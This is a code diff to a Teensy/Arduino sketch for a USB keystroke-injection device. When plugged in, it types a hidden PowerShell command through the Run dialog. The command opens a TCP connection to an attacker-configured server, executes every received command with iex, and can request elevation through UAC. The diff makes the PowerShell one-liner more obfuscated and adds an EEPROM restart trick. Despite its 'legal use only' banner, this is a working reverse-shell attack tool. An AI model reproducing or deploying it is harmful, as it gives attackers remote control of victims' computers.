@@ -13,14 +13,17 @@
 // `--------------------> : ##      INTENDED FOR LEGAL USE ONLY       ##
 // `--------------------> : ############################################
 
+#include <EEPROM.h>
+#define CPU_RESTART (*(uint32_t *)0xE000ED0C = 0x5FA0004)
+
  /////////////
-// Config  /////////////////////////////////////////////////
-String sAddr = "0.0.0.0";     // TCP Server Address       //   
-String sPort = "1337";        // TCP Server Port          //
-String sEnc  = "UTF8";        // Encoding used            //
-bool   bUAC  = false;         // Using UAC prompt accept? //
-int    iMs   = 1000;          // Delay in milliseconds    //
-////////////////////////////////////////////////////////////
+// Config  //////////////////////
+String sAddr = "0.0.0.0";      // TCP Server Address
+String sPort = "1337";         // TCP Server Port
+String sEnc  = "UTF8";         // Encoding used
+bool   bUAC  = false;          // Using UAC prompt accept?
+int    iMs   = 1000;           // Delay in milliseconds
+/////////////////////////////////
 
 // Pin numbers
 unsigned int iLedPin     = 13;
@@ -38,8 +41,8 @@ void ledBlink(int reps,int iDelay) {
 }
 
 // Press key(s) and unpress it/them
-void pressKey(unsigned int iKey, unsigned int iModifier = 0) {
-  Keyboard.set_modifier(iModifier);
+void pressKey(unsigned int iKey, unsigned int iModifiers = 0) {
+  Keyboard.set_modifier(iModifiers);
   Keyboard.set_key1(iKey);
   Keyboard.send_now();
   delay(50);
@@ -60,10 +63,19 @@ bool capsOff    (void) { if (isCapsOn())   { pressKey(KEY_CAPS_LOCK);   return t
 
 
 // Wait for Windows to be ready before we start typing.
-void waitForDrivers() {
-  bool bInitialState = isScrollOn();
-  while(bInitialState == isScrollOn()) { pressKey(KEY_SCROLL_LOCK); }
-  scrollOff(); capsOff();
+void waitForDrivers(int iDelay = 0, bool bInitialState = isScrollOn()) {
+
+  while(bInitialState == isScrollOn()) { pressKey(KEY_SCROLL_LOCK); iDelay += 100; }
+  
+  scrollOff(); 
+  capsOff();
+  
+  if (iDelay >= 5000 and EEPROM.read(0) != 1) { 
+    CPU_RESTART; EEPROM.write(0, 1); 
+  } 
+  else if (EEPROM.read(0) != 0) { 
+    EEPROM.write(0, 0); 
+  }
 }
 
 void setup() {
@@ -75,8 +87,8 @@ void setup() {
   pinMode (iButtonPin3, INPUT_PULLUP);
   pinMode (iResetPin, INPUT_PULLUP);
   
-  digitalWrite(iLedPin, LOW); 
- 
+  digitalWrite(iLedPin, LOW);
+  
   // Is windows ready?
   waitForDrivers(); 
 
@@ -89,8 +101,8 @@ void setup() {
   // Prepare the PowerhShell TCP Client
   String sPowerShellCmd = "powershell -w 1 "; 
   if (bUAC) { sPowerShellCmd += "saps powershell -A '-NoE -W 1',{"; }  
-  sPowerShellCmd += "$u=(New-Object Net.Sockets.TCPClient('" + sAddr + "'," + sPort + ")).GetStream();[byte[]]$w=0..64KB|%{0};";
-  sPowerShellCmd += "while(($i=$u.Read($w,0,$w.Length))-ne0){$d=([text.encoding]::UTF8).GetString($w,0,$i);(iex $d)}";
+  sPowerShellCmd += "sal n New-Object;for($w=n byte[] 64kb){for($u=(n Net.Sockets.TCPClient('" + sAddr + "'," + sPort;
+  sPowerShellCmd += ")).GetStream();($i=$u.Read($w,0,$w.Length))-ne0){iex ([text.encoding]::UTF8).GetString($w,0,$i)>$null}}";
   if (bUAC) { sPowerShellCmd += "} -Verb runAs"; }
 
   // Open Windows + R
